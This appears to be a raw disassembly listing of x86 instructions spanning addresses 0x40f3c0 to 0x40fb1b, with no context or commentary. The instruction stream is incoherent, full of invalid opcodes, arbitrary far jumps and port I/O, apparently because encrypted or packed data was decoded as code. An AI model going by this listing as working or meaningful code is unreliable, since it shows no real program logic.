  40f3c0:	jp     0x40f37a
  40f3c2:	fwait
  40f3c3:	adc    eax,0x758bfa2d
  40f3c8:	mov    ebx,DWORD PTR [ebp-0x530b049d]
  40f3ce:	and    BYTE PTR [eax+0x6b85b71],dh
  40f3d4:	retf   0x21f2
  40f3d7:	mov    edi,DWORD PTR [ebx-0x45cb6ae1]
  40f3dd:	jne    0x40f385
  40f3df:	ins    BYTE PTR es:[edi],dx
  40f3e0:	jbe    0x40f398
  40f3e2:	aad    0x8
  40f3e4:	sbb    esp,DWORD PTR [ebx]
  40f3e6:	fwait
  40f3e7:	mov    dh,0x1a
  40f3e9:	push   cs
  40f3ea:	xor    DWORD PTR [ebp-0x62],0xa99b291e
  40f3f1:	push   ebx
  40f3f2:	add    esp,DWORD PTR [edx]
  40f3f4:	jno    0x40f3a7
  40f3f6:	inc    ebp
  40f3f7:	es inc ebp
  40f3f9:	xchg   esi,eax
  40f3fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3fb:	rdpmc  
  40f3fd:	and    BYTE PTR [eax+0x3f75aad5],dl
  40f403:	arpl   dx,dx
  40f405:	dec    edi
  40f406:	aad    0xb0
  40f408:	in     eax,0xbd
  40f40a:	xor    eax,DWORD PTR [edi+0x755c1bf9]
  40f410:	es loopne 0x40f395
  40f413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f414:	or     esp,DWORD PTR [ecx+0x1]
  40f417:	pushf  
  40f418:	jno    0x40f3f2
  40f41a:	jnp    0x40f402
  40f41c:	mov    ss,WORD PTR [edi+0x117fa022]
  40f422:	xor    BYTE PTR [ebp-0x4c],0xee
  40f426:	je     0x40f44c
  40f428:	fwait
  40f429:	jns    0x40f461
  40f42b:	pop    es
  40f42c:	jno    0x40f3ef
  40f42e:	add    dl,bh
  40f430:	fxch   st(0)
  40f432:	inc    esi
  40f433:	mov    ecx,0x19a92001
  40f438:	test   al,0xad
  40f43b:	pop    ds
  40f43c:	inc    ecx
  40f43d:	and    ebp,edx
  40f43f:	xor    esp,DWORD PTR [edx-0x4c]
  40f442:	in     eax,dx
  40f443:	push   ecx
  40f444:	mov    ah,0xc7
  40f446:	inc    edx
  40f447:	jne    0x40f425
  40f449:	push   ds
  40f44a:	push   esi
  40f44b:	in     al,0x63
  40f44d:	cwde   
  40f44e:	pushf  
  40f44f:	jge    0x40f4c2
  40f451:	hlt    
  40f452:	or     al,al
  40f454:	push   edx
  40f455:	or     BYTE PTR ds:0xad271c9b,ah
  40f45b:	mov    ebp,0x14f2ad7c
  40f460:	clc    
  40f461:	inc    edi
  40f462:	add    al,0xe3
  40f464:	jno    0x40f436
  40f466:	xchg   DWORD PTR [ecx-0x2d],ebx
  40f469:	stc    
  40f46a:	mov    WORD PTR [edi+edx*4+0x3],ds
  40f46e:	pop    ss
  40f46f:	jne    0x40f4a4
  40f471:	mov    BYTE PTR [edi],0xc7
  40f474:	jge    0x40f3f9
  40f476:	xchg   BYTE PTR [ecx],dl
  40f478:	scas   al,BYTE PTR es:[edi]
  40f479:	imul   ecx,DWORD PTR [ecx+0x8c21f75],0xefeb000
  40f483:	jne    0x40f44a
  40f485:	nop    edi
  40f488:	jmp    0xd54c:0x530a5ada
  40f48f:	pop    ebp
  40f490:	(bad)  
  40f491:	call   0x759f:0x4473ace8
  40f498:	outs   dx,BYTE PTR ds:[esi]
  40f499:	add    esp,DWORD PTR ds:0xb68f7b53
  40f49f:	mov    ebx,0xc0fffc71
  40f4a4:	add    DWORD PTR [ebp-0xf],ecx
  40f4a7:	sub    bl,ch
  40f4a9:	and    ch,BYTE PTR [eax+ebx*4-0x40]
  40f4ad:	add    al,0xcd
  40f4af:	call   0xf5d294bc
  40f4b4:	cli    
  40f4b5:	mov    ah,0xdc
  40f4b7:	dec    esi
  40f4b8:	jle    0x40f44a
  40f4ba:	xchg   ebp,eax
  40f4bb:	cli    
  40f4bc:	add    DWORD PTR [ebx+0x2060ef63],eax
  40f4c2:	aas    
  40f4c3:	cld    
  40f4c4:	mov    bl,0xe5
  40f4c6:	and    DWORD PTR [edx],ecx
  40f4c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c9:	(bad)  
  40f4ca:	fadd   DWORD PTR ds:0xc7610f77
  40f4d0:	push   ebp
  40f4d1:	adc    BYTE PTR [edx*2-0x60c3d960],bh
  40f4d8:	aaa    
  40f4d9:	sub    eax,0xcfbf1c5e
  40f4de:	(bad)  
  40f4df:	cli    
  40f4e0:	adc    ebp,esp
  40f4e2:	aad    0xba
  40f4e4:	mov    ds:0xb9af007,al
  40f4e9:	rcl    BYTE PTR [ebx],1
  40f4eb:	jne    0x40f499
  40f4ed:	cmp    bh,ch
  40f4ef:	ja     0x40f4ec
  40f4f1:	and    eax,0x5e8f0557
  40f4f6:	sub    DWORD PTR [ebp+0x4eecf8b1],esp
  40f4fc:	xor    dl,BYTE PTR [eax-0x470f8b04]
  40f502:	xor    BYTE PTR [eax-0xf1cc46f],bh
  40f508:	jno    0x40f53f
  40f50a:	es out dx,eax
  40f50c:	mul    DWORD PTR [ecx+edi*8-0x25d96b28]
  40f513:	xor    DWORD PTR [edx+esi*8],0xffffffc8
  40f517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f518:	push   esp
  40f519:	in     al,dx
  40f51a:	fsubr  DWORD PTR [esi+0x71]
  40f51d:	in     al,0xb1
  40f51f:	sbb    edi,edx
  40f521:	bound  ecx,QWORD PTR [ecx]
  40f523:	xor    eax,0xd1c031d3
  40f528:	jge    0x40f50a
  40f52a:	pop    es
  40f52b:	or     eax,DWORD PTR [ecx]
  40f52d:	hlt    
  40f52e:	retf   
  40f52f:	aam    0x71
  40f531:	add    DWORD PTR [ebp+0x3],eax
  40f534:	test   eax,0x5b86785a
  40f539:	and    BYTE PTR [ecx-0x5317f1ab],bh
  40f53f:	jg     0x40f569
  40f541:	mov    dl,0xd5
  40f543:	lds    esi,FWORD PTR [esi-0x51]
  40f546:	inc    ecx
  40f547:	or     eax,0x74e29ef7
  40f54c:	imul   edi,edi,0x6ffa0e79
  40f552:	push   ebx
  40f553:	mov    eax,ds:0x43455571
  40f558:	jmp    0x4790:0x2a8f8c5d
  40f55f:	jne    0x40f55f
  40f561:	fld    QWORD PTR [eax+eax*8]
  40f564:	cmp    eax,0x713209d3
  40f569:	test   al,0x46
  40f56b:	stos   DWORD PTR es:[edi],eax
  40f56c:	ret    
  40f56d:	mov    bl,0x7
  40f56f:	pop    edi
  40f570:	add    ah,BYTE PTR [eax]
  40f572:	add    BYTE PTR [ecx+0x563b2613],dl
  40f578:	add    al,0x5e
  40f57a:	fldcw  WORD PTR [edi]
  40f57c:	retf   0x95b8
  40f57f:	ins    BYTE PTR es:[edi],dx
  40f580:	xor    al,0x3e
  40f582:	std    
  40f583:	push   esp
  40f584:	mov    al,BYTE PTR [edx-0x62]
  40f587:	int    0x95
  40f589:	rcl    dh,cl
  40f58b:	jb     0x40f5a7
  40f58d:	xchg   edi,eax
  40f58e:	leave  
  40f58f:	jmp    0x809ee01
  40f594:	jno    0x40f5c2
  40f596:	mov    ebx,0x14fc61ea
  40f59b:	adc    BYTE PTR [esp+edi*1],dl
  40f59e:	(bad)  
  40f5a0:	push   ds
  40f5a1:	ja     0x40f575
  40f5a3:	and    eax,0xe5d5835f
  40f5a8:	in     eax,0xa0
  40f5aa:	adc    ebx,DWORD PTR [edi+0x58f77ce]
  40f5b0:	arpl   WORD PTR [edi],di
  40f5b2:	push   ds
  40f5b3:	mov    eax,0xc2582056
  40f5b8:	imul   esp,eax,0xffffffc4
  40f5bb:	or     al,0xab
  40f5bd:	mov    WORD PTR [ebp+0x6101175],es
  40f5c3:	push   edx
  40f5c4:	mov    edx,0x63755f87
  40f5c9:	push   DWORD PTR [edx]
  40f5cb:	cmp    al,0x2e
  40f5cd:	jnp    0x40f551
  40f5cf:	sbb    eax,0x959b3a71
  40f5d4:	or     bl,BYTE PTR [ebp+0x1fc1bb90]
  40f5da:	(bad)  
  40f5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5dc:	cld    
  40f5dd:	jg     0x40f570
  40f5df:	add    cl,BYTE PTR [edx+0xb]
  40f5e2:	(bad)  
  40f5e3:	sub    BYTE PTR [eax+0x52],cl
  40f5e6:	arpl   WORD PTR [ebp-0x77],bp
  40f5e9:	ret    
  40f5ea:	adc    BYTE PTR [ebx+0x488e6497],al
  40f5f0:	mov    cl,0x72
  40f5f2:	inc    edx
  40f5f3:	push   cs
  40f5f4:	je     0x40f635
  40f5f6:	aad    0xac
  40f5f8:	js     0x40f64c
  40f5fa:	add    ecx,esp
  40f5fc:	aaa    
  40f5fd:	inc    edx
  40f5fe:	in     al,dx
  40f5ff:	je     0x40f5a1
  40f601:	cmp    DWORD PTR [eax-0x18],esp
  40f604:	add    eax,0xe45b7d8d
  40f609:	or     dl,dh
  40f60b:	add    eax,0x738f122d
  40f610:	lods   eax,DWORD PTR ds:[esi]
  40f611:	and    DWORD PTR [edx+0x1a4f9575],edx
  40f617:	mov    al,ds:0xa6b9984d
  40f61c:	js     0x40f640
  40f61e:	mov    esi,0x5bf34b9
  40f623:	mov    dh,0x98
  40f625:	dec    esp
  40f626:	jmp    0xef7f:0xa6702874
  40f62d:	sub    al,0x4e
  40f62f:	in     eax,0x74
  40f631:	pop    esp
  40f632:	sahf   
  40f633:	add    cl,BYTE PTR [esi+0x5e]
  40f636:	fcomi  st,st(5)
  40f638:	sbb    DWORD PTR [edx],esi
  40f63a:	sar    DWORD PTR [edi+ecx*2],0x20
  40f63e:	mov    cl,0x26
  40f640:	or     bl,dl
  40f642:	cmp    eax,DWORD PTR [ecx+0x57]
  40f645:	add    esi,ebx
  40f647:	add    DWORD PTR [edi+ebp*1],ebx
  40f64a:	xchg   ebp,eax
  40f64b:	inc    edx
  40f64c:	rol    DWORD PTR [edx+0x217d9fac],cl
  40f652:	mov    DWORD PTR [ecx+0xf],esp
  40f655:	xchg   ebx,eax
  40f656:	nop
  40f657:	xor    DWORD PTR [ecx+0x71fb9cad],0xffffffaf
  40f65e:	sub    DWORD PTR [ebp-0x2ca99536],ebp
  40f664:	push   ebx
  40f665:	and    BYTE PTR [ecx+0x58303aa7],dl
  40f66b:	or     DWORD PTR [ebp-0x2e],edi
  40f66e:	or     eax,0x869fa706
  40f673:	rcl    DWORD PTR [edi-0x27],0x51
  40f677:	add    DWORD PTR [eax+0x5a27ae1f],ebx
  40f67d:	in     al,0x42
  40f67f:	arpl   dx,bx
  40f681:	das    
  40f682:	aad    0x24
  40f684:	push   ss
  40f685:	popf   
  40f686:	fucomp st(5)
  40f688:	fisttp WORD PTR fs:[esi*2+0x54d3ac06]
  40f690:	fidiv  WORD PTR [esi-0x51]
  40f693:	push   ebx
  40f694:	jno    0x40f6ad
  40f696:	push   esi
  40f697:	jbe    0x40f717
  40f699:	inc    esi
  40f69a:	outs   dx,DWORD PTR ds:[esi]
  40f69b:	aad    0x6d
  40f69d:	and    BYTE PTR [ecx],cl
  40f69f:	ja     0x40f65d
  40f6a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6a2:	xchg   ebx,eax
  40f6a3:	mov    dh,0xf3
  40f6a5:	lods   al,BYTE PTR ds:[esi]
  40f6a6:	aad    0xb7
  40f6a8:	adc    ebp,DWORD PTR [ecx-0x582580a5]
  40f6ae:	ret    
  40f6af:	jne    0x40f644
  40f6b1:	outs   dx,DWORD PTR ds:[esi]
  40f6b2:	stc    
  40f6b3:	jmp    0x65a52f5f
  40f6b8:	lods   al,BYTE PTR ds:[esi]
  40f6b9:	sahf   
  40f6ba:	pop    edi
  40f6bb:	outs   dx,BYTE PTR ds:[esi]
  40f6bc:	imul   edi,DWORD PTR [ebp-0x2b],0x58
  40f6c0:	scas   eax,DWORD PTR es:[edi]
  40f6c1:	shr    BYTE PTR [ebx+0x33],1
  40f6c4:	neg    BYTE PTR [ebp-0x47a18b24]
  40f6ca:	pushf  
  40f6cb:	gs mov al,0xc1
  40f6ce:	xchg   ebp,eax
  40f6cf:	xchg   edx,eax
  40f6d0:	jno    0x40f6b7
  40f6d2:	adc    al,BYTE PTR [ecx-0x70]
  40f6d5:	sub    DWORD PTR [ebx],0xe61fe60e
  40f6db:	xor    DWORD PTR [eax],esp
  40f6dd:	xchg   BYTE PTR [esp+ebp*4],dl
  40f6e0:	fs push ebp
  40f6e2:	inc    ebp
  40f6e3:	(bad)  
  40f6e4:	push   ecx
  40f6e5:	or     dl,ch
  40f6e7:	sbb    BYTE PTR [esi],dh
  40f6e9:	mov    fs,WORD PTR [edi+0x2b7f3e75]
  40f6ef:	test   al,0x99
  40f6f1:	sbb    al,BYTE PTR [ecx]
  40f6f3:	jbe    0x40f6f4
  40f6f5:	cwde   
  40f6f6:	xchg   esi,eax
  40f6f7:	int3   
  40f6f8:	es push 0x7a
  40f6fb:	dec    ecx
  40f6fc:	pop    ecx
  40f6fd:	jo     0x40f6d4
  40f6ff:	cmp    eax,0xd1eafd29
  40f704:	sub    BYTE PTR [esi],ah
  40f706:	fidiv  WORD PTR [esp+ebp*1-0x5a]
  40f70a:	idiv   DWORD PTR [edx+0xd6c0473]
  40f710:	jno    0x40f6aa
  40f712:	pop    ds
  40f713:	jbe    0x40f70f
  40f715:	or     DWORD PTR [ebp+0x34],ebp
  40f718:	dec    esp
  40f719:	and    BYTE PTR [ecx],al
  40f71b:	iret   
  40f71c:	stos   BYTE PTR es:[edi],al
  40f71d:	out    dx,al
  40f71e:	mov    ds:0xe51e7aad,eax
  40f723:	int3   
  40f724:	sub    BYTE PTR [eax-0x7a],0x15
  40f728:	pop    eax
  40f729:	dec    edx
  40f72a:	cmp    bh,al
  40f72c:	clc    
  40f72d:	pop    ds
  40f72e:	test   DWORD PTR [esi],ebx
  40f730:	fnstcw WORD PTR [edi]
  40f732:	add    al,0xb3
  40f734:	mov    ebp,0xfa5fd5b9
  40f739:	sub    eax,DWORD PTR [esi]
  40f73b:	xor    eax,0x8c485b51
  40f740:	push   es
  40f741:	(bad)  
  40f742:	xlat   BYTE PTR ds:[ebx]
  40f743:	je     0x40f754
  40f745:	mov    BYTE PTR [eax+ecx*2+0x4b1dbcf0],al
  40f74c:	loopne 0x40f76d
  40f74e:	dec    ebx
  40f74f:	in     al,0x4
  40f751:	sbb    al,0xa4
  40f753:	pop    edi
  40f754:	pop    ss
  40f755:	and    BYTE PTR [ecx-0x6e],dl
  40f758:	fs inc eax
  40f75a:	test   BYTE PTR [ebx+0x1cd5d372],dl
  40f760:	in     al,0x27
  40f762:	pushf  
  40f763:	scas   al,BYTE PTR es:[edi]
  40f764:	mov    ah,0xd4
  40f766:	push   ebx
  40f767:	and    DWORD PTR [ebp+0x8],0xfffffff5
  40f76b:	mov    edx,0xdcb12243
  40f770:	sub    BYTE PTR [eax+0x7ad0e015],dh
  40f776:	loopne 0x40f783
  40f778:	lds    esi,FWORD PTR [eax+0x53fab5d0]
  40f77e:	shr    BYTE PTR ds:0x50d11fa4,0xe3
  40f785:	jns    0x40f7c9
  40f787:	mov    ch,0xa3
  40f789:	rcl    ch,0x3
  40f78c:	and    BYTE PTR [ebp+0x33],0x5d
  40f790:	xchg   esi,eax
  40f791:	adc    dl,BYTE PTR [ecx+0x75]
  40f794:	xor    dl,al
  40f796:	and    eax,DWORD PTR [eax+0x63]
  40f799:	arpl   dx,ax
  40f79b:	sub    dh,BYTE PTR [esp+ecx*2-0x6e]
  40f79f:	rol    dh,cl
  40f7a1:	aas    
  40f7a2:	mov    dh,0x1d
  40f7a4:	fbstp  TBYTE PTR [ecx]
  40f7a6:	cmp    BYTE PTR [ebp-0x15],dh
  40f7a9:	add    al,0x23
  40f7ab:	adc    cl,BYTE PTR [edi]
  40f7ad:	pop    ds
  40f7ae:	out    dx,al
  40f7af:	sub    esi,DWORD PTR [ecx+0x3d]
  40f7b2:	das    
  40f7b3:	outs   dx,BYTE PTR ds:[esi]
  40f7b4:	imul   esp,DWORD PTR [edi-0x6b],0x6
  40f7b8:	aad    0x1f
  40f7ba:	push   0xdbbb649
  40f7bf:	add    DWORD PTR [edx+edi*8+0xaa6c7d5],0x6a
  40f7c7:	data16 fsub DWORD PTR [ebx-0x7e]
  40f7cb:	jne    0x40f7b0
  40f7cd:	sbb    eax,0x41a74359
  40f7d2:	pusha  
  40f7d3:	hlt    
  40f7d4:	jbe    0x40f7d5
  40f7d6:	inc    ebp
  40f7d7:	imul   edx,DWORD PTR [ebp+0x68],0xffffffd8
  40f7db:	dec    esi
  40f7dc:	or     al,0xfa
  40f7de:	div    ah
  40f7e0:	sub    DWORD PTR [edx-0x62068b05],eax
  40f7e6:	jl     0x40f825
  40f7e8:	aam    0x6b
  40f7ea:	test   esp,ebp
  40f7ec:	leave  
  40f7ed:	das    
  40f7ee:	test   al,0x84
  40f7f0:	inc    esi
  40f7f1:	xor    DWORD PTR [ebx+edx*2],edx
  40f7f4:	jno    0x40f843
  40f7f6:	(bad)  
  40f7f7:	dec    BYTE PTR [edi+ebx*8+0x70]
  40f7fb:	jne    0x40f86c
  40f7fd:	les    ebx,FWORD PTR [ecx]
  40f7ff:	mul    DWORD PTR [eax+0x71783828]
  40f805:	jno    0x40f7fd
  40f807:	mov    edx,0x97f444c4
  40f80c:	push   edi
  40f80d:	and    BYTE PTR ds:0x39654b91,dl
  40f813:	mov    bl,0x76
  40f815:	cwde   
  40f816:	loopne 0x40f7d4
  40f818:	test   eax,0x5756b49
  40f81d:	push   0x5
  40f81f:	sbb    edi,eax
  40f821:	pop    ds
  40f822:	xor    dl,BYTE PTR [ebx+0x5b5aad90]
  40f828:	mov    ch,ch
  40f82a:	aad    0xd5
  40f82c:	ss jno 0x40f81e
  40f82f:	leave  
  40f830:	imul   DWORD PTR [edi-0x57]
  40f833:	jbe    0x40f818
  40f835:	cmp    eax,0xb1f72ea9
  40f83b:	gs mov cl,0x86
  40f83e:	aad    0x17
  40f840:	xor    BYTE PTR [eax+eax*2+0x6ac812a0],bh
  40f847:	jne    0x40f864
  40f849:	adc    al,0x6f
  40f84b:	xchg   ecx,eax
  40f84c:	pop    edx
  40f84d:	ins    BYTE PTR es:[edi],dx
  40f84e:	dec    esp
  40f84f:	sti    
  40f850:	in     al,dx
  40f851:	fcmovnbe st,st(6)
  40f853:	adc    bh,ch
  40f855:	pop    esp
  40f856:	clc    
  40f857:	inc    BYTE PTR [edx-0x34]
  40f85a:	popf   
  40f85b:	daa    
  40f85c:	ret    0x8891
  40f85f:	jne    0x40f894
  40f861:	push   es
  40f862:	fild   QWORD PTR [edx+0x1418e760]
  40f868:	jno    0x40f871
  40f86a:	ret    
  40f86b:	cmp    BYTE PTR [eax-0x655007dc],bl
  40f871:	pop    eax
  40f872:	int    0xe2
  40f874:	icebp  
  40f875:	fstp   st(3)
  40f877:	les    esi,FWORD PTR [eax-0x1c]
  40f87a:	popf   
  40f87b:	mov    ds:0xeaefaa71,eax
  40f880:	dec    esp
  40f881:	popf   
  40f882:	mov    bl,0xbe
  40f884:	mov    esi,0x59988e1f
  40f889:	ss stc 
  40f88b:	jbe    0x40f90a
  40f88d:	push   edi
  40f88e:	aad    0x78
  40f890:	pusha  
  40f891:	(bad)  
  40f892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f893:	push   cs
  40f894:	pop    edx
  40f895:	loop   0x40f8ca
  40f897:	jne    0x40f836
  40f899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f89a:	lahf   
  40f89b:	add    bl,ah
  40f89d:	cdq    
  40f89e:	adc    edi,eax
  40f8a0:	jno    0x40f8a9
  40f8a2:	mov    ebp,0x2261e1fd
  40f8a7:	pop    ebx
  40f8a8:	das    
  40f8a9:	and    BYTE PTR [edi+0x11],dl
  40f8ac:	cmp    ch,BYTE PTR [ebx+0x6873050f]
  40f8b2:	aad    0xd7
  40f8b4:	retf   0x9b94
  40f8b7:	push   cs
  40f8b8:	addps  xmm0,xmm0
  40f8bb:	jne    0x40f93b
  40f8bd:	jbe    0x40f934
  40f8bf:	cs mov dl,0xf7
  40f8c2:	test   al,0x4a
  40f8c4:	jno    0x40f8bf
  40f8c6:	sub    DWORD PTR [ebx+edx*1+0x6326dba6],esp
  40f8cd:	xchg   ebx,eax
  40f8ce:	fdiv   DWORD PTR [edi+edi*1-0x4a]
  40f8d2:	in     al,0x2c
  40f8d4:	int3   
  40f8d5:	cmp    al,0x83
  40f8d7:	cmp    esi,DWORD PTR [edx+0x20]
  40f8da:	cli    
  40f8db:	pop    ebx
  40f8dc:	xor    DWORD PTR [ecx+0x476d307d],esp
  40f8e2:	push   DWORD PTR [edx+ebp*4+0x4]
  40f8e6:	inc    esp
  40f8e7:	ja     0x40f936
  40f8e9:	push   es
  40f8ea:	loope  0x40f8a9
  40f8ec:	je     0x40f8a1
  40f8ee:	mov    eax,ds:0xb866a171
  40f8f3:	std    
  40f8f4:	icebp  
  40f8f5:	inc    eax
  40f8f6:	stos   BYTE PTR es:[edi],al
  40f8f7:	xchg   edx,eax
  40f8f8:	or     dl,BYTE PTR [ebx-0x36174b0f]
  40f8fe:	jnp    0x40f8f4
  40f900:	xchg   ecx,eax
  40f901:	int3   
  40f902:	aad    0xd3
  40f904:	ret    
  40f905:	aad    0x9
  40f907:	mov    ch,0x4a
  40f909:	sar    DWORD PTR [edi+edx*2],cl
  40f90c:	mov    ebp,0x23fdfa20
  40f911:	ficom  DWORD PTR [ebx-0x1f]
  40f914:	loopne 0x40f911
  40f916:	push   edx
  40f917:	test   BYTE PTR [ecx-0x69],dh
  40f91a:	loopne 0x40f927
  40f91c:	mov    esi,0xd825972f
  40f921:	pop    ds
  40f922:	pop    edx
  40f923:	je     0x40f8ba
  40f925:	jb     0x40f998
  40f927:	out    dx,eax
  40f928:	addr16 lock jmp 0x40f954
  40f92c:	xor    DWORD PTR [ebp+edx*8+0x74e3b75],eax
  40f933:	or     DWORD PTR [edi],edx
  40f935:	and    ebx,DWORD PTR [eax+0xd]
  40f938:	push   esi
  40f939:	sub    DWORD PTR [edi],0xffffff93
  40f93c:	pop    ecx
  40f93d:	out    0x63,eax
  40f93f:	sub    dh,BYTE PTR [ecx-0x60]
  40f942:	shl    DWORD PTR [ecx+0x2c],cl
  40f945:	ret    
  40f946:	sbb    bl,bh
  40f948:	(bad)  
  40f949:	cmp    al,0x20
  40f94b:	(bad)  
  40f94c:	in     al,0x5
  40f94e:	lds    eax,FWORD PTR [ebp+ecx*4+0x36e295bd]
  40f955:	(bad)  
  40f956:	adc    BYTE PTR [edx-0x54],dh
  40f959:	push   edi
  40f95a:	pop    edx
  40f95b:	jbe    0x40f97a
  40f95d:	mov    esp,0x6a65082f
  40f962:	mov    ebp,0xa2207f1a
  40f967:	mov    BYTE PTR ds:0xfa0cc726,dh
  40f96d:	loopne 0x40f9ea
  40f96f:	inc    ebp
  40f970:	in     eax,dx
  40f971:	hlt    
  40f972:	aad    0x3d
  40f974:	pop    ecx
  40f975:	(bad)
  40f979:	ret    0x7c55
  40f97c:	sti    
  40f97d:	jge    0x40f905
  40f97f:	add    ch,0x8f
  40f982:	sub    al,0xef
  40f984:	in     al,dx
  40f985:	ins    BYTE PTR es:[edi],dx
  40f986:	hlt    
  40f987:	inc    ebx
  40f988:	cwde   
  40f989:	not    ebp
  40f98b:	ss cld 
  40f98d:	pushw  ss
  40f98f:	(bad)  [ebp+0x16]
  40f992:	retf   
  40f993:	mov    bl,0x97
  40f995:	cmp    edx,ebx
  40f997:	cmp    ch,BYTE PTR [edi]
  40f999:	inc    edi
  40f99a:	loop   0x40f990
  40f99c:	stc    
  40f99d:	lahf   
  40f99e:	cmp    eax,0xffc18085
  40f9a3:	fidiv  DWORD PTR [edi+0x7f]
  40f9a6:	lock fs dec ebx
  40f9a9:	cmp    DWORD PTR [ebx+0x169af775],0xb09a1c15
  40f9b3:	pop    edx
  40f9b4:	ins    DWORD PTR es:[edi],dx
  40f9b5:	ret    0xa9d5
  40f9b8:	push   0xffffffd4
  40f9ba:	push   0xe0249d61
  40f9bf:	je     0x40fa36
  40f9c1:	and    DWORD PTR [edx+0x3b0d358e],eax
  40f9c7:	jl     0x40f9f2
  40f9c9:	(bad)  
  40f9ca:	aad    0x47
  40f9cc:	stos   BYTE PTR es:[edi],al
  40f9cd:	iret   
  40f9ce:	mov    ah,dh
  40f9d0:	int    0x0
  40f9d2:	sub    eax,0xbb0d8975
  40f9d7:	ins    DWORD PTR es:[edi],dx
  40f9d8:	paddusw mm1,QWORD PTR [edx-0x6d]
  40f9dc:	jno    0x40f966
  40f9de:	test   BYTE PTR [edx-0x79],ah
  40f9e1:	cmp    ch,BYTE PTR [esi+0x297be2c5]
  40f9e7:	fdiv   QWORD PTR [ecx+0x4c]
  40f9ea:	pop    ecx
  40f9eb:	mov    ebx,0xfbaac6ec
  40f9f0:	lea    edx,[esi+0x54]
  40f9f3:	cwde   
  40f9f4:	jno    0x40f9d1
  40f9f6:	ss adc edi,esp
  40f9f9:	mov    dh,0xb4
  40f9fb:	jne    0x40fa07
  40f9fd:	jo     0x40fa16
  40f9ff:	retf   
  40fa00:	test   dl,dl
  40fa02:	xor    cl,BYTE PTR [ebx-0x6386568f]
  40fa08:	jo     0x40fa72
  40fa0a:	jnp    0x40f9a2
  40fa0c:	mov    edx,0x715b7558
  40fa11:	aam    0xaf
  40fa13:	mov    ah,0x91
  40fa15:	sub    DWORD PTR fs:[ecx],0x72
  40fa19:	mov    dl,cl
  40fa1b:	jmp    0x623489a0
  40fa20:	ins    DWORD PTR es:[edi],dx
  40fa21:	cmp    BYTE PTR [edx+0x75],ch
  40fa24:	adc    DWORD PTR [ebx],0xbc29df18
  40fa2a:	imul   edx,DWORD PTR [ecx+0x71],0xd587a1cf
  40fa31:	stos   DWORD PTR es:[edi],eax
  40fa32:	pop    ebp
  40fa33:	mov    ah,0x0
  40fa35:	xchg   esp,eax
  40fa36:	loope  0x40fab0
  40fa38:	rcr    BYTE PTR [ebp-0x608c9377],1
  40fa3e:	sti    
  40fa3f:	(bad)  
  40fa40:	scas   eax,DWORD PTR es:[edi]
  40fa41:	not    ebp
  40fa43:	xchg   edi,eax
  40fa44:	push   ss
  40fa45:	gs xor eax,0x47cb5a89
  40fa4b:	mov    al,0x2a
  40fa4d:	mov    ss,ebp
  40fa4f:	js     0x40facb
  40fa51:	sbb    al,0x4
  40fa53:	fnstsw WORD PTR [ecx+edx*2-0x5fa87eee]
  40fa5a:	xchg   esp,eax
  40fa5b:	mov    eax,ds:0x7bbae85f
  40fa60:	xchg   DWORD PTR [ebx],esp
  40fa62:	inc    edi
  40fa63:	mov    BYTE PTR [esi+0x66],ch
  40fa66:	aam    0x35
  40fa68:	dec    DWORD PTR [edi-0x1b]
  40fa6b:	into   
  40fa6c:	mov    al,0xa0
  40fa6e:	mov    ebx,0xa6032475
  40fa73:	pop    es
  40fa74:	dec    ebx
  40fa75:	and    dl,BYTE PTR [ecx+ebp*2-0x7bd1dfcd]
  40fa7c:	add    BYTE PTR [ebx+0x3cba5b90],ah
  40fa82:	aad    0x56
  40fa84:	pop    ecx
  40fa85:	mov    ecx,0x2a4ad816
  40fa8a:	or     ch,ch
  40fa8c:	test   eax,0xde3d851f
  40fa91:	rcr    esi,0x47
  40fa94:	int3   
  40fa95:	pushf  
  40fa96:	lea    edi,[edx+ebp*4+0xa93479b]
  40fa9d:	outs   dx,BYTE PTR ds:[esi]
  40fa9e:	xchg   ebp,eax
  40fa9f:	sbb    eax,eax
  40faa1:	fnsave [esi]
  40faa3:	dec    ebp
  40faa4:	jge    0x40fad4
  40faa6:	ffreep st(6)
  40faa8:	mov    ah,0xed
  40faaa:	cmc    
  40faab:	imul   DWORD PTR [edi+0x7564c1bb]
  40fab1:	sub    eax,0x583244f0
  40fab6:	xchg   ebp,eax
  40fab7:	cmp    BYTE PTR [ebx-0x438a6b3c],al
  40fabd:	popf   
  40fabe:	stos   DWORD PTR es:[edi],eax
  40fabf:	stos   DWORD PTR es:[edi],eax
  40fac0:	(bad)  
  40fac2:	in     eax,0x99
  40fac4:	lods   eax,DWORD PTR ds:[esi]
  40fac5:	dec    esp
  40fac6:	into   
  40fac7:	hlt    
  40fac8:	je     0x40fb02
  40faca:	daa    
  40facb:	loop   0x40faf7
  40facd:	mov    BYTE PTR [ebp-0x3ec33e0b],dh
  40fad3:	jne    0x40facd
  40fad5:	daa    
  40fad6:	fs out dx,al
  40fad8:	imul   BYTE PTR [eax-0x16]
  40fadb:	inc    ebx
  40fadc:	jp     0x40fb4e
  40fade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fadf:	and    eax,eax
  40fae1:	scas   al,BYTE PTR es:[edi]
  40fae2:	xchg   edi,eax
  40fae3:	mov    ch,0xe7
  40fae5:	sub    edx,edi
  40fae7:	or     DWORD PTR fs:[eax],esp
  40faea:	int    0x8c
  40faec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faed:	int    0x10
  40faef:	aas    
  40faf0:	xor    eax,0xbd06d6ba
  40faf5:	sub    DWORD PTR [edx+0x60],ebx
  40faf8:	xchg   edi,eax
  40faf9:	in     eax,dx
  40fafa:	xor    eax,0x61209a1a
  40faff:	popa   
  40fb00:	mov    ch,0x9c
  40fb02:	daa    
  40fb03:	add    eax,0xde75ef26
  40fb08:	cdq    
  40fb09:	inc    edx
  40fb0a:	adc    al,0xf9
  40fb0c:	jbe    0x40fb2d
  40fb0e:	sub    eax,DWORD PTR [ebp-0x14]
  40fb11:	xor    BYTE PTR [ecx],0x4b
  40fb14:	and    BYTE PTR cs:[edx+esi*2-0x45],cl
  40fb19:	add    ecx,ecx
  40fb1b:	pop    ss
